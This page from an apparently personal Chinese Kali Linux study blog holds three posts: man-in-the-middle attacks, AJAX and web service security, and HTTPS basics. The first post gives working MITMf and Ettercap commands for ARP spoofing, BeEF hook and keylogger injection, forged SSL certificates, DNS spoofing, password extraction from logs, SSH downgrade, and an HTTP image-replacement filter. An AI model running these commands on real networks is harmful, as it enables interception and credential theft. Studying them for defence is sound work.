-                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/" itemprop="url">Kali Linux笔记(五十八)：SSL、TLS中间人攻击--注入XSS</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
-                2020-01-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1.8k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  8 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
-<li>注入XSS<ul>
-<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
-<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
-<li>一旦得手，影响范围巨大 </li>
-<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
-</ul>
-</li>
-</ul>
-<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
-<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
-<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
-<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
-<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
-<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
-<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
-<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
-</ul>
-</li>
-<li>启动beef <ul>
-<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
-<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
-</ul>
-</li>
-<li>mitmf中间人注入xss脚本（结合Beef）<ul>
-<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
-</ul>
-</li>
-<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
-<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
-<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
-<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
-<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
-<li>–hsts（新的安全协议）<ul>
-<li>HTTP Strict Transport Security </li>
-<li>防止协议降级、cookie窃取 </li>
-<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
-<li>限制user-agent、https等</li>
-</ul>
-</li>
-<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
-<li>凌空插后门 </li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
-<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
-<li>统一的中间人攻击工具 </li>
-<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
-<li>支持SSH1、SSL中间人攻击</li>
-</ul>
-</li>
-<li>模块划分 <ul>
-<li>Snifer </li>
-<li>MITM </li>
-<li>Filter </li>
-<li>Log </li>
-<li>Plugin</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
-<li>Snifer<ul>
-<li>负责数据包转发</li>
-<li>Unified<ul>
-<li>单网卡情况下独立完成三层包转发</li>
-<li>始终禁用内核IP_Forward功能</li>
-</ul>
-</li>
-<li>Bridge <ul>
-<li>双网卡情况下的一层MITM模式</li>
-<li>可作为IPS过滤数据包</li>
-<li>不可在网关上使用（透明网桥）</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
-<li>MITM <ul>
-<li>把流量重定向到ettercap主机上 </li>
-<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
-</ul>
-</li>
-<li>实现MITM的方法 <ul>
-<li>ARP（一般为动态类型的ARP表）</li>
-<li>ICMP <ul>
-<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
-<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
-</ul>
-</li>
-<li>DHCP <ul>
-<li>修改网关地址，半双工，回包不经过Kali</li>
-<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
-<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
-</ul>
-</li>
-<li>Switch Port Stealing（交换机端口窃取）<ul>
-<li>交换机根据源MAC地址更新</li>
-<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
-<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
-<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
-</ul>
-</li>
-<li>NDP <ul>
-<li>IPv6协议欺骗技术</li>
-<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
-<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
-<li>Ettercap使用ARP request包进行攻击 </li>
-</ul>
-</li>
-<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
-<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
-</ul>
-</li>
-</ul>
-<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
-<li>用户操作界面 <ul>
-<li>-T 文本界面（文本字符）</li>
-<li>-G 图形界面 </li>
-<li>-C 基于文本的图形界面（文本类似图形化）</li>
-<li>-D 后台模式 </li>
-</ul>
-</li>
-<li>指定目标 <ul>
-<li>IPv4：MAC/IPv4/Ports </li>
-<li>IPv6：MAC/IPv4/IPv6/Ports </li>
-<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
-</ul>
-</li>
-<li>权限 <ul>
-<li>主配置文件：/etc/ettercap/etter.conf</li>
-<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
-<li>日志写入目录需要nobody有写入权 </li>
-<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
-</ul>
-</li>
-<li>基于伪造证书的SSL MITIM <ul>
-<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
-<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
-<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
-<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
-<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
-<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
-<li>参数<ul>
-<li>-M（MITM技术）</li>
-<li>-F（过滤器）</li>
-<li>-P（模块）</li>
-<li>-w（网络流量记录）</li>
-<li>-l（简单记录日志）</li>
-<li>-L（记录所有日志信息）</li>
-<li>-m（账号密码信息）</li>
-<li>-q（安静模式/有用的信息）</li>
-</ul>
-</li>
-<li>MITM攻击<ul>
-<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
-<li>找一个FTP服务器</li>
-<li>输入账号/密码</li>
-<li>查看ettercap字符界面</li>
-</ul>
-</li>
-<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
-<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
-<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
-<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
-<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
-<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
-<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
-<li>Sniff → Unified/Bridge sniffing → 网卡</li>
-<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
-<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
-<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
-<li>Start → Start sniffing</li>
-<li>找一个FTP服务器</li>
-<li>输入账号/密码</li>
-<li>查看ettercap图形界面</li>
-</ul>
-<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
-<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
-<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
-<li>Sniff → Unified/Bridge sniffing → 网卡</li>
-<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
-<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
-<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
-<li>Start → Start sniffing</li>
-<li>找一个有SSL页面</li>
-<li>输入账号/密码</li>
-<li>查看ettercap图形界面</li>
-</ul>
-</li>
-</ul>
-<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
-<li>DNS欺骗（图形界面） <ul>
-<li>dns_spoof插件配置文件 </li>
-<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
-<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
-<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
-<li>Sniff → Unified/Bridge sniffing → 网卡</li>
-<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
-<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
-<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
-<li>Start → Start sniffing</li>
-<li>找一个有SSL页面</li>
-<li>输入账号/密码</li>
-<li>查看ettercap图形界面</li>
-</ul>
-</li>
-<li>DNS欺骗（字符界面）<ul>
-<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
-<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
-<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
-<li>Filter <ul>
-<li>/usr/share/ettercap/</li>
-<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
-<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
-<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
-<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
-<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
-</ul>
-</li>
-<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123; </span><br><span class="line">     msg(&quot;data on TCP 80\n&quot;); </span><br><span class="line">         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/" itemprop="url">Kali Linux笔记(五十七)：AJAX、Web Server</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T08:34:39+08:00">
-                2020-01-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  871 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-AJAX"><a href="#1-AJAX" class="headerlink" title="1. AJAX"></a>1. AJAX</h4><ul>
-<li>Asynchronous JavaScript and XML</li>
-<li>是一个概念，而非一种新的编程语言，是一组现有技术的组合</li>
-<li>通过客户端脚本动态更新页面部分内容，而非整个页面</li>
-<li>降低带宽使用，提高速度</li>
-<li>提升用户体验</li>
-<li>后台异步访问</li>
-</ul>
-<h4 id="2-AJAX、DHTML、DOM"><a href="#2-AJAX、DHTML、DOM" class="headerlink" title="2. AJAX、DHTML、DOM"></a>2. AJAX、DHTML、DOM</h4><ul>
-<li>AJAX组件<ul>
-<li>JavaScript：ajax的核心组件，使用XMLHTTPRequest对象接口向服务器发起请求，接收并处理服务器响应数据</li>
-</ul>
-</li>
-<li>Dynamic HTML（DHTML）<ul>
-<li>早于AJAX出现，通过javascript、CSS等在客户端修改HTML页面element，缺点是完全依赖客户端代码修改页面，与服务器的交互由javascript applets完成，AJAX的XHR弥补了他的缺点（注册用户）</li>
-</ul>
-</li>
-<li>Document Object Model（DOM）<ul>
-<li>处理html、xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的Properties、method、event</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-基于AJAX的WEB应用工作流程"><a href="#3-基于AJAX的WEB应用工作流程" class="headerlink" title="3. 基于AJAX的WEB应用工作流程"></a>3. 基于AJAX的WEB应用工作流程</h4><ul>
-<li>XMLHTTPRequest API创建对象xmlhttp进行访问</li>
-<li>Xml、json（默认首选）、html、文本、图片</li>
-<li>多个异步请求独立通信，互不依赖</li>
-<li>AJAX框架<ul>
-<li>JQuery</li>
-<li>Dojo Toolkit</li>
-<li>Google web toolkit（GWT）</li>
-<li>Microsoft AJAX library</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐请求过程：User Interface →(JavaScript)→ AJAX Engine →(HTTP Request)→ Web Server → Database,backend server
-⭐响应过程：Databse,backend server → Web Server →(HTML\JSON\XML)→ AJAX Engine →(DHTML)→ User Interface</code></pre></blockquote>
-<h4 id="4-AJAX的安全问题"><a href="#4-AJAX的安全问题" class="headerlink" title="4. AJAX的安全问题"></a>4. AJAX的安全问题</h4><ul>
-<li>目前没有通用的AJAX安全最佳实践，其攻击面不为大多数人所知</li>
-<li>AJAX的安全问题<ul>
-<li>多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程</li>
-<li>AJAX引擎是个全功能的脚本解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP（同源策略），但可能绕过</li>
-<li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露、</li>
-<li>暴漏应用程序逻辑</li>
-</ul>
-</li>
-<li>AJAX对渗透测试的挑战<ul>
-<li>异步请求数量多且隐蔽</li>
-<li>触发AJAX请求的条件无规律</li>
-<li>手动和截断代理爬网可能产生大量遗漏</li>
-</ul>
-</li>
-<li>AJAX爬网工具<ul>
-<li>ZAP（Sites → 右键 → Attack → AJAX Spider）</li>
-</ul>
-</li>
-<li>客户端代码审计<ul>
-<li>源码</li>
-<li>Firebug</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-Web-Service（F12）"><a href="#5-Web-Service（F12）" class="headerlink" title="5. Web Service（F12）"></a>5. Web Service（F12）</h4><ul>
-<li>Web Service<ul>
-<li>面向服务的架构（service oriented architecture）便于不同系统集成共享数据和功能</li>
-<li>尤其适合不想要暴漏数据模型和程序逻辑而访问数据的场景</li>
-<li>无页面（最典型的类型）</li>
-</ul>
-</li>
-<li>两种类型的Web Service<ul>
-<li>Simple object access protocol（SOAP）<ul>
-<li>传统的Web Service开发方法，xml是唯一的数据交换格式</li>
-<li>要求安全性的应用更多采用</li>
-</ul>
-</li>
-<li>RESTful（Representational Transfer architecture–REST）<ul>
-<li>目前更多被采用的轻量的web service，JSON是首选数据交换格式</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Web Service安全考虑<ul>
-<li>使用API Key或session token实现和跟踪身份认证</li>
-<li>身份认证由服务器完成，而非客户端</li>
-<li>API Key、用户名、Session token永远不要通过URL发送</li>
-<li>RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li>
-<li>SOAP提供强于HTTPS的WS-security机制（传输层实现）</li>
-<li>使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的密钥加密API KEY</li>
-<li>RESTful应只允许身份认证用户使用PUT、DELETE方法</li>
-<li>使用随机token防止CSRF攻击</li>
-<li>对用户提交参数过滤，建议布署基于严格白名单的方法</li>
-<li>报错信息消毒</li>
-<li>直接对象引用应严格身份验证（电商公司以ID作为主索引）</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/" itemprop="url">Kali Linux笔记(五十五)：Https攻击</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-22T23:54:59+08:00">
-                2020-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1.2k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-HTTPS攻击"><a href="#1-HTTPS攻击" class="headerlink" title="1. HTTPS攻击"></a>1. HTTPS攻击</h4><ul>
-<li>全站HTTPS正成为潮流趋势<ul>
-<li>淘宝、百度</li>
-</ul>
-</li>
-<li>HTTPS的作用<ul>
-<li>CIA</li>
-<li>解决的是信息传输过程中数据被篡改、窃取</li>
-<li>加密：对称、非对称、单向(hash计算)</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐CIA
-C：机密性（Confidentiality）指只有授权用户可以获取信息。
-I：完整性（Integrity）指信息在输入和传输的过程中，不被非法授权修改和破坏，保证数据的一致性。
-A：可用性（Availability）指保证合法用户对信息和资源的使用不会被不正当地拒绝。</code></pre></blockquote>
-<ul>
-<li>HTTPS攻击方法<ul>
-<li>降级攻击（高强度加密算法的降级攻击）</li>
-<li>解密攻击（明文、证书伪造）</li>
-<li>协议漏洞、实现方法的漏洞、配置不严格</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-Secure-socket-layer"><a href="#2-Secure-socket-layer" class="headerlink" title="2. Secure socket layer"></a>2. Secure socket layer</h4><ul>
-<li>保证网络通信安全的加密协议</li>
-<li>1994年由Netscape开发成为统一标准</li>
-<li>1999年TLS（transport layer security）取代SSL v3</li>
-<li>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<ul>
-<li>Heartbleed</li>
-<li>POODLE</li>
-<li>BEAST</li>
-</ul>
-</li>
-<li>TLS当前最新版本1.2</li>
-<li>TLS/SSL、HTTPS、HTTP over SSL通俗上表示同意含义</li>
-<li>SSL/TLS也被用于其他场景的传输通道加密<ul>
-<li>邮件传输（服务器间、客户端与服务期间,SMTP/POP3为明文协议）</li>
-<li>数据库服务器间</li>
-<li>LDAP身份认证服务器</li>
-<li>SSL VPN</li>
-<li>远程桌面RDP通信过程中的加密和身份认证</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-SSL加密"><a href="#3-SSL加密" class="headerlink" title="3. SSL加密"></a>3. SSL加密</h4><ul>
-<li>WEB通信中的SSL加密（PKI体系架构）<ul>
-<li>公钥证书（受信任的第三方证书颁发机构签名颁发）</li>
-<li>VeriSign</li>
-<li>Thawte</li>
-<li>GlobalSign</li>
-<li>Symantec</li>
-</ul>
-</li>
-<li>加密过程<ul>
-<li>握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输</li>
-<li>加密套件（Cipher Suite：对称加密+非对称加密+单向加密+密钥算法）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐加密信息传输过程（哈希值用于数据传输的完整性）
-1.用交换的对称密钥对明文进行加密
-2.对加密的明文进行哈希计算，得出一串额外的字符串
-3.对字符串进行服务器私钥加密
-▲ 存在疑问4.加密过程中，将对称密码加密的明文+哈希值+加密后的哈希值一起传给对方
-⭐加密信息解密过程
-1.用服务器公钥对哈希值进行解密，得出哈希值H2
-2.用交换的对称密钥对对称密钥加密的字段进行解密，并计算哈希值H1
-3.比对哈希值H1和H2的值是否相等，保证了数据的完整性和身份认证</code></pre></blockquote>
-<h4 id="4-加密算法"><a href="#4-加密算法" class="headerlink" title="4. 加密算法"></a>4. 加密算法</h4><ul>
-<li>非对称加密算法<ul>
-<li>Diffie-Hellman Key exchange（密钥交换）</li>
-<li>Rivest Shamir Adleman（RSA）</li>
-<li>Elliptic Curve Cryptography（ECC）</li>
-</ul>
-</li>
-<li>对称加密算法<ul>
-<li>Data Encryption Standard（DES/3DES）</li>
-<li>Advance Encryption Standard（AES）</li>
-<li>International Data Encryption Algorithm（IDEA）</li>
-<li>Rivest Cipher 4（RC4）<ul>
-<li>WEP、TLS/SSL、RDP、Secure shell</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>单向加密算法（hash算法）<ul>
-<li>SHA-3已经设计完成，但尚未广泛使用</li>
